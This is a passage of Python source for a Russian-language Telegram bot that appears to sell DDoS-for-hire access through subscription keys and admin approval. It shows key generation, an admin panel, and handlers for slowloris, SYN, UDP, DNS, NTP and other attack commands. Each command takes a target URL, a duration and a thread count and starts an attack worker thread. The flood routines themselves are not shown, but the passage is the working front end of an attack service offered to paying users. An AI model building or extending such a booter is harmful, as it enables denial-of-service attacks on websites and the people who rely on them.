        bot.reply_to(message,
            "❌ *Ключ недействителен или уже использован!*\n\n"
            "Возможные причины:\n"
            "• Ключ введен неправильно\n"
            "• Ключ уже активирован другим пользователем\n"
            "• Ключ истек\n\n"
            "Обратитесь к администратору за новым ключом.",
            reply_markup=kb,
            parse_mode="Markdown")

# ===== СИСТЕМА ОДОБРЕНИЯ АДМИНАМИ =====

@bot.callback_query_handler(func=lambda call: call.data == "apply_access")
def apply_access(call):
    user_id = call.message.chat.id
    username = call.from_user.username or "NoUsername"
    if is_approved(user_id):
        bot.send_message(user_id, "✅ *У тебя уже есть доступ!*", parse_mode="Markdown")
        return
    with db_lock:
        if user_id in users_db["pending"]:
            bot.send_message(user_id, "⚠️ *Заявка уже подана*", parse_mode="Markdown")
            return
        users_db["pending"][user_id] = {
            "username": username,
            "first_name": call.from_user.first_name or "Unknown",
            "status": "pending"
        }
        save_db()
    bot.send_message(user_id, "✅ *Заявка отправлена!*\n\nЖди одобрения от админа.", parse_mode="Markdown")
    with db_lock:
        admins = list(users_db["admins"].items())
    for aid, aname in admins:
        try:
            kb = telebot.types.InlineKeyboardMarkup()
            kb.add(
                telebot.types.InlineKeyboardButton("✅ Принять", callback_data=f"approve_{user_id}"),
                telebot.types.InlineKeyboardButton("❌ Отклонить", callback_data=f"reject_{user_id}")
            )
            bot.send_message(aid,
                f"📋 *НОВАЯ ЗАЯВКА*\n\nID: `{user_id}`\nUsername: @{username}\nИмя: {call.from_user.first_name or 'Unknown'}",
                reply_markup=kb,
                parse_mode="Markdown")
        except:
            pass

@bot.callback_query_handler(func=lambda call: call.data.startswith("approve_"))
def approve_user(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет прав", show_alert=True)
        return
    target_id = int(call.data.split("_")[1])
    with db_lock:
        data = users_db["pending"].pop(target_id, None)
        if data:
            users_db["approved"][target_id] = data["username"]
            save_db()
    bot.edit_message_text("✅ *ОДОБРЕНО*", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
    try:
        bot.send_message(target_id, "✅ *ЗАЯВКА ОДОБРЕНА!*\n\nНапиши /menu", parse_mode="Markdown")
    except:
        pass

@bot.callback_query_handler(func=lambda call: call.data.startswith("reject_"))
def reject_user(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет прав", show_alert=True)
        return
    target_id = int(call.data.split("_")[1])
    with db_lock:
        users_db["pending"].pop(target_id, None)
        save_db()
    bot.edit_message_text("❌ *ОТКЛОНЕНО*", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
    try:
        bot.send_message(target_id, "❌ *ЗАЯВКА ОТКЛОНЕНА*", parse_mode="Markdown")
    except:
        pass

# ===== АДМИН ПАНЕЛЬ =====

@bot.callback_query_handler(func=lambda call: call.data == "admin_panel")
def admin_panel(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет прав", show_alert=True)
        return
    with db_lock:
        pending_cnt = len(users_db["pending"])
        approved_cnt = len(users_db["approved"])
        admins_cnt = len(users_db["admins"])
        subs_cnt = len(users_db["subscriptions"])
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton(f"📋 Заявки ({pending_cnt})", callback_data="admin_pending"))
    kb.add(telebot.types.InlineKeyboardButton(f"👤 Одобренные ({approved_cnt})", callback_data="admin_approved"))
    kb.add(telebot.types.InlineKeyboardButton(f"👨‍💼 Админы ({admins_cnt})", callback_data="admin_list"))
    kb.add(telebot.types.InlineKeyboardButton(f"🔑 Подписки ({subs_cnt})", callback_data="admin_subs"))
    kb.add(telebot.types.InlineKeyboardButton("👥 Выдать админа", callback_data="admin_grant"))
    kb.add(telebot.types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"))
    kb.add(telebot.types.InlineKeyboardButton("🔙 Меню", callback_data="go_menu"))
    bot.send_message(call.message.chat.id,
        "╔════════════════════════════════╗\n"
        "║    👨‍💼 АДМИН ПАНЕЛЬ 👨‍💼       ║\n"
        "╚════════════════════════════════╝",
        reply_markup=kb,
        parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_pending")
def admin_pending(call):
    if not is_admin(call.message.chat.id):
        return
    with db_lock:
        pending = dict(users_db["pending"])
    if not pending:
        bot.send_message(call.message.chat.id, "✅ *Нет заявок*", parse_mode="Markdown")
        return
    for uid, data in pending.items():
        kb = telebot.types.InlineKeyboardMarkup()
        kb.add(
            telebot.types.InlineKeyboardButton("✅ Принять", callback_data=f"approve_{uid}"),
            telebot.types.InlineKeyboardButton("❌ Отклонить", callback_data=f"reject_{uid}")
        )
        text = f"ID: `{uid}`\nUsername: @{data['username']}\nИмя: {data['first_name']}"
        bot.send_message(call.message.chat.id, text, reply_markup=kb, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_approved")
def admin_approved(call):
    if not is_admin(call.message.chat.id):
        return
    with db_lock:
        approved = dict(users_db["approved"])
    if not approved:
        bot.send_message(call.message.chat.id, "⚪ *Нет одобренных*", parse_mode="Markdown")
        return
    text = "👤 *Одобренные:*\n\n"
    for uid, uname in approved.items():
        text += f"ID: `{uid}` — @{uname}\n"
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_list")
def admin_list(call):
    if not is_admin(call.message.chat.id):
        return
    with db_lock:
        admins = dict(users_db["admins"])
    text = "👨‍💼 *Админы:*\n\n"
    for uid, uname in admins.items():
        text += f"ID: `{uid}` — @{uname}\n"
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_subs")
def admin_subs(call):
    if not is_admin(call.message.chat.id):
        return
    with db_lock:
        subs = dict(users_db["subscriptions"])
    if not subs:
        bot.send_message(call.message.chat.id, "⚪ *Нет активных подписок*", parse_mode="Markdown")
        return
    text = "🔑 *Подписки:*\n\n"
    for uid, sub in subs.items():
        sub_type = sub.get("type", "")
        expire = sub.get("expire", 0)
        if sub_type == "perm":
            text += f"ID: `{uid}` — Пожизненная\n"
        else:
            days_left = get_days_left(expire)
            text += f"ID: `{uid}` — 30 дней (осталось {days_left} дн.)\n"
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_grant")
def admin_grant(call):
    if not is_admin(call.message.chat.id):
        return
    bot.send_message(call.message.chat.id,
        "Отправь ID пользователя:\n`/grantadmin <user_id>`",
        parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "admin_stats")
def admin_stats(call):
    if not is_admin(call.message.chat.id):
        return
    with db_lock:
        a = len(users_db["approved"])
        b = len(users_db["admins"])
        p = len(users_db["pending"])
        s = len(users_db["subscriptions"])
        k = len(users_db["available_keys"])
    text = (
        "📊 *Статистика:*\n\n"
        f"Одобренных: {a}\n"
        f"Админов: {b}\n"
        f"В ожидании: {p}\n"
        f"Активных подписок: {s}\n"
        f"Доступных ключей: {k}"
    )
    bot.send_message(call.message.chat.id, text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "go_menu")
def go_menu(call):
    if not has_access(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет доступа", show_alert=True)
        return
    send_menu(call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("method_"))
def method_callback(call):
    if not has_access(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет доступа", show_alert=True)
        return
    global test_running
    
    if test_running:
        bot.answer_callback_query(call.id, "⚠️ Атака уже идет", show_alert=True)
        return
    
    method = call.data.split("_", 1)[1]
    
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("🔙 Меню", callback_data="go_menu"))
    
    bot.send_message(call.message.chat.id,
        f"⚡ *Метод:* `{method}`\n\n"
        f"Команда:\n`/{method} <URL> <время> <потоки>`\n\n"
        f"Пример:\n`/{method} example.com 60 100`\n\n"
        f"💡 *Подсказка:* У вас активная подписка - используйте все возможности бота!",
        parse_mode="Markdown",
        reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data == "my_status")
def my_status(call):
    user_id = call.message.chat.id
    has_sub, sub_type, days_left = is_subscribed(user_id)
    has_approved = is_approved(user_id)
    
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("🔙 Меню", callback_data="go_menu"))
    
    if has_sub:
        if sub_type == "perm":
            expire_date = "Навсегда"
        else:
            expire_timestamp = time.time() + days_left * 24 * 3600
            expire_date = datetime.fromtimestamp(expire_timestamp).strftime('%d.%m.%Y')
        
        text = (
            f"📊 *ВАШ СТАТУС ПОДПИСКИ*\n\n"
            f"✅ *Тип:* {'Пожизненная' if sub_type == 'perm' else '30 дней'}\n"
            f"🔥 *Срок действия:* {expire_date}\n"
            "🚀 *Доступ:* Полный ко всем функциям\n\n"
            "💎 *Преимущества:*\n"
            "• Неограниченное время использования\n"
            "• Все методы атак\n"
            "• Максимальная производительность"
        )
    elif has_approved:
        text = (
            "📊 *ВАШ СТАТУС*\n\n"
            "✅ *Статус:* Доступ открыт администратором\n"
            "🚀 *Доступ:* Полный ко всем функциям\n\n"
            "💡 *Преимущества:*\n"
            "• Все методы атак\n"
            "• Полная статистика"
        )
    else:
        text = (
            "📊 *ВАШ СТАТУС*\n\n"
            "❌ *Статус:* Нет активной подписки или одобрения\n\n"
            "Для получения доступа:\n"
            "1. Купите ключ подписки\n"
            "2. Активируйте: `/activate <ключ>`\n"
            "3. Или подайте заявку администратору\n"
            "4. Получите полный доступ!"
        )
        kb.add(telebot.types.InlineKeyboardButton("🔑 Активировать", callback_data="activate_key"))
    
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, 
                         reply_markup=kb, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "how_to_get")
def how_to_get_access(call):
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("🔑 Активировать ключ", callback_data="activate_key"))
    kb.add(telebot.types.InlineKeyboardButton("📝 Подать заявку", callback_data="apply_access"))
    kb.add(telebot.types.InlineKeyboardButton("🔙 Главное меню", callback_data="back_start"))
    
    text = (
        "ℹ️ *КАК ПОЛУЧИТЬ ДОСТУП К БОТУ*\n\n"
        "1️⃣ *Способ 1: Ключ подписки*\n"
        "   • Купите ключ (30 дней или пожизненный)\n"
        "   • Активируйте: `/activate <ключ>`\n\n"
        "2️⃣ *Способ 2: Заявка администратору*\n"
        "   • Нажмите 'Подать заявку'\n"
        "   • Дождитесь одобрения админа\n\n"
        "3️⃣ *Наслаждайтесь ботом!*"
    )
    
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, 
                         reply_markup=kb, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "back_start")
def back_to_start(call):
    user_id = call.message.chat.id
    bot.delete_message(call.message.chat.id, call.message.message_id)
    # Создаем фейковое сообщение для вызова start_handler
    fake_message = type('obj', (object,), {
        'chat': type('obj', (object,), {'id': user_id}),
        'from_user': type('obj', (object,), {'username': 'fake', 'first_name': 'Fake'})
    })()
    start_handler(fake_message)

# ===== СОЗДАНИЕ КЛЮЧЕЙ (только для админов) =====

@bot.callback_query_handler(func=lambda call: call.data == "create_keys")
def create_keys_menu(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет прав", show_alert=True)
        return
    
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("📦 30 дней", callback_data="create_30d"))
    kb.add(telebot.types.InlineKeyboardButton("♾️ Пожизненная", callback_data="create_perm"))
    kb.add(telebot.types.InlineKeyboardButton("🔙 Назад", callback_data="back_start"))
    
    bot.edit_message_text(
        "🔑 *ГЕНЕРАТОР КЛЮЧЕЙ ПОДПИСК*\n\n"
        "Выберите тип подписки для создания ключей:\n\n"
        "📦 *30 дней* - временная подписка на месяц\n"
        "♾️ *Пожизненная* - доступ навсегда",
        call.message.chat.id,
        call.message.message_id,
        reply_markup=kb,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data in ["create_30d", "create_perm"])
def select_amount_menu(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет прав", show_alert=True)
        return
    
    key_type = "30d" if call.data == "create_30d" else "perm"
    type_name = "30 дней" if key_type == "30d" else "пожизненная"
    
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("1 ключ", callback_data=f"amount_1_{key_type}"))
    kb.add(telebot.types.InlineKeyboardButton("5 ключей", callback_data=f"amount_5_{key_type}"))
    kb.add(telebot.types.InlineKeyboardButton("10 ключей", callback_data=f"amount_10_{key_type}"))
    kb.add(telebot.types.InlineKeyboardButton("25 ключей", callback_data=f"amount_25_{key_type}"))
    kb.add(telebot.types.InlineKeyboardButton("🔙 Выбор типа", callback_data="create_keys"))
    
    bot.edit_message_text(
        f"🔑 *СОЗДАНИЕ КЛЮЧЕЙ*\n\n"
        f"Тип подписки: *{type_name}*\n\n"
        f"Выберите количество ключей:",
        call.message.chat.id,
        call.message.message_id,
        reply_markup=kb,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("amount_"))
def confirm_key_creation(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет прав", show_alert=True)
        return
    
    parts = call.data.split("_")
    amount = int(parts[1])
    key_type = parts[2]
    type_name = "30 дней" if key_type == "30d" else "пожизненная"
    
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("✅ Создать", callback_data=f"confirm_{amount}_{key_type}"))
    kb.add(telebot.types.InlineKeyboardButton("❌ Отмена", callback_data="create_keys"))
    
    bot.edit_message_text(
        f"🔑 *ПОДТВЕРЖДЕНИЕ СОЗДАНИЯ*\n\n"
        f"Тип: *{type_name}*\n"
        f"Количество: *{amount}* ключей\n\n"
        f"Вы уверены, что хотите создать {amount} ключей {type_name.lower()}?\n\n"
        f"*Внимание:* Ключи нельзя будет удалить!",
        call.message.chat.id,
        call.message.message_id,
        reply_markup=kb,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_"))
def generate_keys_handler(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Нет прав", show_alert=True)
        return
    
    parts = call.data.split("_")
    amount = int(parts[1])
    key_type = parts[2]
    type_name = "30 дней" if key_type == "30d" else "пожизненная"
    
    keys = create_keys(amount, key_type, call.message.chat.id)
    
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("🔙 Создать еще", callback_data="create_keys"))
    kb.add(telebot.types.InlineKeyboardButton("🏠 Главное меню", callback_data="back_start"))
    
    # Формируем сообщение с ключами
    text = f"✅ *КЛЮЧИ {type_name.upper()} СОЗДАНЫ!*\n\n"
    text += f"📦 Создано ключей: *{amount}*\n"
    text += f"🔑 Тип подписки: *{type_name}*\n\n"
    
    for i, key in enumerate(keys, 1):
        text += f"{i}. `{key}`\n"
    
    text += "\n*Инструкция для пользователей:*\n"
    text += "1. Отправить боту: `/activate <ключ>`\n"
    text += "2. Получить доступ к функционалу\n\n"
    text += f"💡 Ключи одноразовые и активируются только один раз!"
    
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, 
                         reply_markup=kb, parse_mode="Markdown")

# ===== КОМАНДЫ АТАК =====

for _method in ["slowloris", "http", "layer7", "tcp2", "udp", "syn", "dns", "ntp", "post", "pool", "mixed"]:
    def make_handler(m):
        def handler(message):
            user_id = message.chat.id
            if not has_access(user_id):
                bot.reply_to(message, 
                    "❌ *Нет доступа!*\n\n"
                    "Для использования атак нужна активная подписка или одобрение администратора.\n"
                    "Используйте /start для получения доступа.",
                    parse_mode="Markdown")
                return
            
            global test_running
            
            if test_running:
                bot.reply_to(message, "⚠️ *Атака уже выполняется!*\n\n"
                    "Дождитесь завершения текущей атаки или используйте /stop.",
                    parse_mode="Markdown")
                return
            
            parts = message.text.split()
            
            if len(parts) < 4:
                bot.reply_to(message, 
                    f"❌ *Неверный формат команды!*\n\n"
                    f"Правильно: `/{m} <URL> <время> <потоки>`\n\n"
                    f"Пример: `/{m} example.com 60 100`",
                    parse_mode="Markdown")
                return
            
            target_url = parts[1]
            if is_blacklisted(target_url):
                bot.reply_to(message, 
                    "⛔ *Атака на этот ресурс запрещена администратором!*", 
                    parse_mode="Markdown")
                log_warning(f"Пользователь {message.from_user.username} пытался атаковать запрещенный ресурс: {target_url}")
                return
            
            try:
                duration = int(parts[2])
                threads = int(parts[3])
                
                if duration < 1 or duration > 3600:
                    bot.reply_to(message, 
                        "❌ *Неверное время атаки!*\n\n"
                        "Время должно быть от 1 до 3600 секунд (1 час).",
                        parse_mode="Markdown")
                    return
                
                if threads < 1 or threads > 2000:
                    bot.reply_to(message, 
                        "❌ *Неверное количество потоков!*\n\n"
                        "Потоков должно быть от 1 до 2000.",
                        parse_mode="Markdown")
                    return
            
            except ValueError:
                bot.reply_to(message, 
                    "❌ *Неверные параметры!*\n\n"
                    "Время и количество потоков должны быть числами.",
                    parse_mode="Markdown")
                return
            
            username = message.from_user.username or "NoUsername"
            log_user_action(user_id, username, f"Запуск {m} атаки")
            
            # Проверяем доступ еще раз перед запуском
            if not has_access(user_id):
                bot.reply_to(message, 
                    "❌ *Доступ истек во время ожидания!*\n\n"
                    "Активируйте новый ключ или получите одобрение: /start",
                    parse_mode="Markdown")
                return
            
            Thread(
                target=load_test_worker,
                args=(parts[1], duration, threads, m, message.chat.id, username),
                daemon=True
            ).start()
        
        return handler
    
    bot.message_handler(commands=[_method])(make_handler(_method))

@bot.message_handler(commands=['grantadmin'])
def grant_admin_cmd(message):
    if not is_admin(message.chat.id):
        bot.reply_to(message, "❌ Нет прав", parse_mode="Markdown")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "`/grantadmin <user_id>`", parse_mode="Markdown")
        return
    try:
        target_id = int(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ ID должен быть числом", parse_mode="Markdown")
        return
    with db_lock:
        if target_id in users_db["admins"]:
            bot.reply_to(message, "⚠️ Уже админ", parse_mode="Markdown")
            return
        # Берем username из approved или pending, или генерируем
        uname = users_db["approved"].pop(target_id, f"User_{target_id}") if target_id in users_db["approved"] else f"User_{target_id}"
        users_db["admins"][target_id] = uname
        save_db()
    bot.reply_to(message, f"✅ Админ права выданы ID {target_id}", parse_mode="Markdown")
    try:
        bot.send_message(target_id, "👨‍💼 *Тебе выданы права администратора*", parse_mode="Markdown")
    except:
        pass

# ===== ЗАПУСК БОТА =====

if __name__ == "__main__":
    load_db()
    log_success("База данных загружена")
    log_attack("=" * 70)
    log_attack("🔥 COMBINED STRESSER BOT С ПОДПИСКАМИ И ОДОБРЕНИЕМ ЗАПУЩЕН 🔥")
    log_attack("=" * 70)
    
    try:
        bot.infinity_polling(skip_pending=True, timeout=30)
    except Exception as e:
        log_error(f"Критическая ошибка: {str(e)}")
        sys.exit(1)